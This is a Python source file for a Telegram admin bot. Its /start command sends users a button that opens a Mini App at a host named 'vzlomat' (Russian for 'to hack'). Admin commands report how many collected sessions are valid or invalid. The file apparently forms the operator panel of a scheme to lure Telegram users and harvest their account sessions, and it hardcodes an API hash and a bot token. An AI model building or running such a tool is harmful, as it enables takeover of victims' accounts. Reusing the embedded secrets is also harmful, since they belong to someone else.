import os
import sys
import asyncio
import logging
import zipfile
import io
from datetime import datetime
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from session_manager import SessionManager

API_ID = int(os.environ.get("API_ID", 37803152))
API_HASH = os.environ.get("API_HASH", "5d34acaeda36aa1a308e40ae31668795")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8690036172:AAGj9YweZMAdEm4tI5YTKJs_n1oAB-BN78c")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "8866175391").split(",") if x.strip()]
BASE_URL = os.environ.get("BASE_URL", "https://vzlomat.onrender.com")

os.makedirs("logs", exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("logs/admin_bot.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

session_manager = SessionManager()

class AdminBot:
    def __init__(self):
        self.client = TelegramClient("admin_bot", API_ID, API_HASH)

    async def start(self):
        await self.client.start(bot_token=BOT_TOKEN)
        logger.info("✅ Admin bot started!")

        @self.client.on(events.NewMessage(pattern="/start"))
        async def start_cmd(event):
            keyboard = {
                "inline_keyboard": [[{
                    "text": "🚀 Open Panel",
                    "web_app": {"url": BASE_URL}
                }]]
            }
            await event.respond(
                "👋 Welcome! Click the button to open the Mini App.",
                buttons=keyboard
            )
            logger.info(f"Start command from {event.sender_id}")

        @self.client.on(events.NewMessage(pattern="/admin"))
        async def admin_cmd(event):
            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ Access denied")
                return
            stats = session_manager.get_stats()
            await event.respond(
                f"🔐 Admin Panel\n\n"
                f"Total: {stats.get('total', 0)}\n"
                f"Valid: {stats.get('valid', 0)}\n"
                f"Invalid: {stats.get('invalid', 0)}"
            )

        @self.client.on(events.NewMessage(pattern="/stats"))
        async def stats_cmd(event):
            if event.sender_id not in ADMIN_IDS:
                return
            stats = session_manager.get_stats()
            await event.respond(
                f"📊 Stats:\nTotal: {stats.get('total', 0)}\nValid: {stats.get('valid', 0)}\nInvalid: {stats.get('invalid', 0)}"
            )

        await self.client.run_until_disconnected()

if __name__ == "__main__":
    bot = AdminBot()
    asyncio.run(bot.start())